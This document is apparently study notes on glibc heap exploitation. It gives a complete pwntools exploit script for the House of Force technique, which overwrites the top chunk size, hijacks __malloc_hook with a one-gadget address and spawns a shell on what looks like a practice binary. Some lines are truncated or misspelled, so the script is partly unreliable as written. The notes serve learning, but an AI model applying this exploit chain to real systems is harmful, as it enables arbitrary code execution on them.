# Core ideas

- The essence of modern heap exploitation techniques is  
requesting fake chunk overlapping sensitive program data

- Tampering runtime metadata in a favourable way generally
requires multiple techniques to be chained together

- Tcache makes exploitation easier


# House of force

This is one of the simplest attacks, it involves overwriting the top chunk (or wilderness)
size field (its second quadword) with a 0xffffffffffffffff

```python
#!/usr/bin/python3
from pwn import *

elf = context.binary = elf("hall_of_fame")
libc = elf(elf.runpath + b"/libc.so.6")

gs = '''
continue
'''
def start():
    if args.gdb:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

def malloc(score, data):
    io.sendline(b"1")
    io.sendlineafter(b"> ", f"{score}")
    io.sendlineafter(b"> ", data)
    io.recvuntil(b"> ")

# the position of latest addition is at 0x603000
# the position of puts is at 0x7ffff7e48420
def view():
    io.sendline(b"2")

    io.recvline()

    heap_leak = io.recvline()
    puts_leak = io.recvline()

    io.recvutil(b"> ")

    heap = int(heap_leak[38:], 16)
    puts_addr = int(puts_leak[27:], 16)

    return heap, puts_addr

io = start()
io.recvuntil(b"> ")
io.timeout = 0.1

# ===

heap, puts_addr = view()
libc.address = puts_addr - libc.sym.puts

log.info(f"libc @ 0x{libc.address:02x}")
log.info(f"heap @ 0x{heap:02x}")

# ===

onegadget = libc.address + 0x10a2fc
top_chunk_size = 0xffffffffffffffff
size = 48
payload = b"b"*48 + p64(top_chunk_size)

# overflow into top chunk's size 
malloc(size, payload)
# leak the address that would be returned by malloc
latest_heap, _ = view()

log.info(f"latest heap chunk would be returned @ 0x{latest_heap:02x}")

# calculate how much memory is left to reach the end of virtual memory
# the minus -0x38 is necessary as i noticed inspecting the binary that my chunk was allocated at tha
delta = libc.sym.__malloc_hook - 0x10 - latest_heap - 0x38

log.info(f"delta between heap (0x{latest_heap:02x}) and __malloc_hook (0x{libc.sym.__malloc_hook:02x

# request a chunk to fill the space between heap and __malloc_hook
malloc(delta, b"")

# request a chunk overlapping __malloc_hook and overwrite it
malloc(32, p64(onegadget))
log.info("one gadget prepared")

# trigger __malloc_hook call
malloc(0, b"")

io.interactive()
```

# Unsortedbin attack
